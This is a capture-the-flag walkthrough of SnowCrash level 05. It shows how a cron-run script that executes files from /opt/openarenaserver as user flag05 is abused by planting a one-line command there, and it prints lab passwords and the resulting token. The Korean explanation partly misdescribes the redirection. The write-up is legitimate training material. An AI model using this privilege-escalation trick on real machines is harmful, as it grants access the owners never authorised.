## Level 05

Login as usual with a password

```
ssh -i ~/.ssh/id_rsa.pub level05@127.0.0.1 -p 4242
ne2searoevaevoem4ov4ar8ap
```

We got a message when we just logged in as "You have new mail."

```
🧼 ➜  ~ ssh -i ~/.ssh/id_rsa.pub level05@127.0.0.1 -p 4242
	   _____                      _____               _
	  / ____|                    / ____|             | |
	 | (___  _ __   _____      _| |     _ __ __ _ ___| |__
	  \___ \| '_ \ / _ \ \ /\ / / |    | '__/ _` / __| '_ \
	  ____) | | | | (_) \ V  V /| |____| | | (_| \__ \ | | |
	 |_____/|_| |_|\___/ \_/\_/  \_____|_|  \__,_|___/_| |_|

  Good luck & Have fun

          10.0.2.15 fec0::30be:dfbf:f703:ee2 fec0::89b:22ff:fef1:29df
level05@127.0.0.1's password:
You have new mail.
level05@SnowCrash:~$ ls -la
total 12
dr-xr-x---+ 1 level05 level05  100 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level05 level05  220 Apr  3  2012 .bash_logout
-r-x------  1 level05 level05 3518 Aug 30  2015 .bashrc
-r-x------  1 level05 level05  675 Apr  3  2012 .profile
```

So, I found the small hint from /var/mail/level05

```
level05@SnowCrash:/$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

So, I was looking for /usr/sbin/openarenaserver and we found a script as below. Let's found out one by one.

```
level05@SnowCrash:/$ cat /usr/sbin/openarenaserver
#!/bin/sh

# Loop through files in the  vdirectory
for i in /opt/openarenaserver/* ; do

    # Set a CPU time limit of 5 seconds for each script execution
	(ulimit -t 5; bash -x "$i")
        # Remove the executed script file
	rm -f "$i"
done
```

> So, the script goes through each file in the specified directory, sets a CPU time limit of 5 seconds for its execution, executes the script with debugging output, and then removes the script file.

We can't and should not put anything inside **/opt/openarenaserver** because this directory will be deleted in every 2 minutes, so we should put our file safely in tmp file.

**We therefore, need to create a bash script in that directory,to get the file and to make sure that the optut is redirected to a file in /tmp. So, the overall effect of this command is to create a file named getflag05 in the /opt/openarenaserver/ directory.**

```
level05@SnowCrash:/usr/sbin$ echo 'getflag > /tmp/flag05' > /opt/openarenaserver/getflag05
level05@SnowCrash:/usr/sbin$ cat /tmp/flag05
Check flag.Here is your token : viuaaale9huek52boumoomioc
```

> **note** : echo 'getflag > /tmp/flag05' : This echoes the string to the standard output. The string contains a command that redirectes the output of the getflag command to a file located at /tmp/flag05

> /opt/openarenaserver/getflag05 : This redirects the standard output of the echo command to a file located at /opt/openarenaserver/getflag05 This file will be created or overwritten with the echoed string

<details>
  <summary> Details in Korean </summary>
  > `echo 'getflag > /tmp/flag05' > /opt/openarenaserver/getflag05`: 이 명령은 `'getflag > /tmp/flag05'`라는 문자열을 `/opt/openarenaserver/getflag05` 파일에 씁니다. 여기서 `getflag > /tmp/flag05`는 `/tmp/flag05` 파일로 `getflag` 명령의 출력을 리다이렉트하도록 하는 명령입니다.

> **즉 따라서 이 한 줄은 "컴퓨터야, 'getflag'라는 명령을 실행해서 그 결과를 `/tmp/flag05`라는 파일에 저장한 다음, 그 파일을 `/opt/openarenaserver/` 디렉토리에 `getflag05`라는 이름으로 적어놔!"라고 컴퓨터에게 말하는 것이에요.**

`echo 'getflag > /tmp/flag05' > /opt/openarenaserver/getflag05` 명령에서 리다이렉션은 두 단계로 이루어집니다.

1. `echo 'getflag > /tmp/flag05'`: 이 부분에서 `echo` 명령은 단순히 문자열 `'getflag > /tmp/flag05'`을 터미널에 출력합니다. 이때 `>`가 나타나는 것은 파일이나 디렉토리에 쓰기를 하라는 의미가 아니라, `echo` 명령의 출력이 터미널에 나가도록 하는 역할을 합니다.

2. `> /opt/openarenaserver/getflag05`: 이 부분에서 리다이렉션이 일어납니다. 이 부분은 터미널에 나가는 출력을 파일 `/opt/openarenaserver/getflag05`에 쓰기라는 의미입니다. 즉, 이 부분에서 `echo`의 출력이 `/opt/openarenaserver/getflag05` 파일로 저장됩니다.

결론적으로, 먼저 `echo` 명령이 실행되고 그 출력이 터미널에 나가다가, 그 출력을 `/opt/openarenaserver/getflag05` 파일로 리다이렉션됩니다.

  </details>

<details>
  <summary> Password </summary>
  viuaaale9huek52boumoomioc
  </details>
